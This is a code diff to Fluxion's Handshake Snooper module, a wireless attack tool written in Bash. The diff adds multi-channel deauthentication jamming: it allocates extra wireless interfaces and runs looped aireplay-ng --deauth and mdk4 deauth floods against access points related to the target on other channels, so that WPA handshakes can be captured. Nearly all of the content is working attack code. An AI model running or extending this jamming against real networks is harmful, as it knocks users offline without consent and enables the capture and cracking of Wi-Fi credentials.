@@ -191,7 +191,17 @@ handshake_snooper_stop_deauthenticator() {
     kill "$HandshakeSnooperDeauthenticatorPID" &> $FLUXIONOutputDevice
   fi
 
+  if [ ${#HandshakeSnooperRelatedBSSIDJammerPIDs[@]} -gt 0 ]; then
+    local pid
+    for pid in "${HandshakeSnooperRelatedBSSIDJammerPIDs[@]}"; do
+      fluxion_kill_lineage $pid &> $FLUXIONOutputDevice
+    done
+  fi
+
   HandshakeSnooperDeauthenticatorPID=""
+  HandshakeSnooperRelatedBSSIDJammerPIDs=()
+  sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
+  rm -f "$FLUXIONWorkspacePath"/mdk4_blacklist_ch*.lst
 }
 
 handshake_snooper_start_deauthenticator() {
@@ -234,6 +244,37 @@ handshake_snooper_start_deauthenticator() {
         "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done"
     ;;
   esac
+
+  HandshakeSnooperRelatedBSSIDJammerPIDs=()
+  if [ ${#HandshakeSnooperRelatedBSSIDJammers[@]} -gt 0 ]; then
+    local i
+    for i in "${!HandshakeSnooperRelatedBSSIDJammers[@]}"; do
+      local jammerIface="${HandshakeSnooperRelatedBSSIDJammers[$i]}"
+      local jammerChannel="${HandshakeSnooperRelatedBSSIDChannels[$i]}"
+      local jammerMACs="${HandshakeSnooperRelatedBSSIDMACs[$i]}"
+      local blacklistFile="$FLUXIONWorkspacePath/mdk4_blacklist_ch${jammerChannel}.lst"
+
+      echo "$jammerMACs" | tr ',' '\n' > "$blacklistFile"
+
+      case "$HandshakeSnooperDeauthenticatorIdentifier" in
+        "$HandshakeSnooperAireplayMethodOption")
+          local mac
+          for mac in $(echo "$jammerMACs" | tr ',' ' '); do
+            xterm $FLUXIONHoldXterm -bg black -fg "#FF6600" \
+              -title "Handshake Deauth CH$jammerChannel [$mac]" -e \
+              "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $mac --ignore-negative-one $jammerIface; done" &
+            HandshakeSnooperRelatedBSSIDJammerPIDs+=($!)
+          done
+        ;;
+        "$HandshakeSnooperMdk4MethodOption")
+          xterm $FLUXIONHoldXterm -bg black -fg "#FF6600" \
+            -title "Handshake Deauth CH$jammerChannel [$FluxionTargetSSID]" -e \
+            "while true; do sleep 7; timeout 3 mdk4 $jammerIface d -b $blacklistFile -c $jammerChannel; done" &
+          HandshakeSnooperRelatedBSSIDJammerPIDs+=($!)
+        ;;
+      esac
+    done
+  fi
 }
 
 
@@ -335,6 +376,117 @@ handshake_snooper_set_jammer_interface() {
   local jammerIface=${FluxionInterfaces[$selectedInterface]:-$selectedInterface}
 
   HandshakeSnooperJammerInterface=$jammerIface
+}
+
+HandshakeSnooperRelatedBSSIDJammers=()
+HandshakeSnooperRelatedBSSIDChannels=()
+HandshakeSnooperRelatedBSSIDMACs=()
+HandshakeSnooperRelatedBSSIDJammerPIDs=()
+
+handshake_snooper_unset_related_bssid_jammers() {
+  local i
+  for i in "${!HandshakeSnooperRelatedBSSIDJammers[@]}"; do
+    local jammerIface="${HandshakeSnooperRelatedBSSIDJammers[$i]}"
+    if [ "$jammerIface" ]; then
+      fluxion_deallocate_interface "$jammerIface" 2>/dev/null
+    fi
+  done
+
+  HandshakeSnooperRelatedBSSIDJammers=()
+  HandshakeSnooperRelatedBSSIDChannels=()
+  HandshakeSnooperRelatedBSSIDMACs=()
+}
+
+handshake_snooper_available_jammer_interfaces() {
+  interface_list_wireless
+  local interface
+  for interface in "${InterfaceListWireless[@]}"; do
+    if [ "$interface" = "$HandshakeSnooperJammerInterface" ] || \
+       [ "$interface" = "$HandshakeSnooperJammerInterfaceOriginal" ] || \
+       [ "$interface" = "$FluxionTargetTrackerInterface" ]; then
+      continue
+    fi
+
+    local mappedInterface="${FluxionInterfaces[$interface]}"
+    if [ "$mappedInterface" = "$HandshakeSnooperJammerInterface" ] || \
+       [ "$mappedInterface" = "$FluxionTargetTrackerInterface" ]; then
+      continue
+    fi
+
+    echo "$interface"
+  done
+  echo ""
+}
+
+handshake_snooper_set_related_bssid_jammers() {
+  HandshakeSnooperRelatedBSSIDJammers=()
+  HandshakeSnooperRelatedBSSIDChannels=()
+  HandshakeSnooperRelatedBSSIDMACs=()
+
+  if [ ${#FluxionTargetRelatedBSSIDs[@]} -eq 0 ]; then
+    return 0
+  fi
+
+  local otherChannelBSSIDs=()
+  local relatedItem
+  for relatedItem in "${FluxionTargetRelatedBSSIDs[@]}"; do
+    local relatedChannel="${relatedItem##*:}"
+    relatedChannel="${relatedChannel//[[:space:]]/}"
+    local targetChannelTrimmed="${FluxionTargetChannel//[[:space:]]/}"
+    if [ "$relatedChannel" != "$targetChannelTrimmed" ]; then
+      otherChannelBSSIDs+=("$relatedItem")
+    fi
+  done
+
+  if [ ${#otherChannelBSSIDs[@]} -eq 0 ]; then
+    return 0
+  fi
+
+  declare -A channelBSSIDs
+  local channel
+  for relatedItem in "${otherChannelBSSIDs[@]}"; do
+    local relatedMAC="${relatedItem%:*}"
+    channel="${relatedItem##*:}"
+    if [ -z "${channelBSSIDs[$channel]}" ]; then
+      channelBSSIDs[$channel]="$relatedMAC"
+    else
+      channelBSSIDs[$channel]="${channelBSSIDs[$channel]},$relatedMAC"
+    fi
+  done
+
+  echo
+  echo -e "$FLUXIONVLine ${CCyn}Related BSSIDs detected on ${#channelBSSIDs[@]} other channel(s)$CClr"
+  echo -e "$FLUXIONVLine ${CWht}Choose extra jammer interfaces to deauth both radios during capture$CClr"
+
+  for channel in "${!channelBSSIDs[@]}"; do
+    local macs="${channelBSSIDs[$channel]}"
+    echo
+    echo -e "$FLUXIONVLine ${CWht}Select interface for channel ${CCyn}$channel${CWht} (BSSIDs: ${CYel}$macs${CWht})$CClr"
+
+    if ! fluxion_get_interface handshake_snooper_available_jammer_interfaces \
+      "$(format center "$CWht[$CRed-$CWht]$CClr Select interface for channel $channel:"; echo)"; then
+      continue
+    fi
+
+    local selectedInterface="$FluxionInterfaceSelected"
+    if [ -z "$selectedInterface" ]; then
+      continue
+    fi
+
+    if ! fluxion_allocate_interface "$selectedInterface"; then
+      echo -e "$FLUXIONVLine ${CRed}Failed to allocate interface for channel $channel$CClr"
+      continue
+    fi
+
+    local allocatedInterface="${FluxionInterfaces[$selectedInterface]}"
+    if [[ "$allocatedInterface" == flux* ]]; then
+      HandshakeSnooperRelatedBSSIDJammers+=("$allocatedInterface")
+    else
+      HandshakeSnooperRelatedBSSIDJammers+=("$selectedInterface")
+    fi
+    HandshakeSnooperRelatedBSSIDChannels+=("$channel")
+    HandshakeSnooperRelatedBSSIDMACs+=("$macs")
+  done
 }
 
 handshake_snooper_unset_verifier_identifier() {
@@ -525,6 +677,7 @@ unprep_attack() {
   handshake_snooper_unset_verifier_synchronicity
   handshake_snooper_unset_verifier_interval
   handshake_snooper_unset_verifier_identifier
+  handshake_snooper_unset_related_bssid_jammers
   handshake_snooper_unset_jammer_interface
   handshake_snooper_unset_deauthenticator_identifier
 
@@ -552,6 +705,8 @@ prep_attack() {
   if ! fluxion_do_sequence handshake_snooper sequence[@]; then
     return 1
   fi
+
+  handshake_snooper_set_related_bssid_jammers
 
   HandshakeSnooperState="Ready"
 }
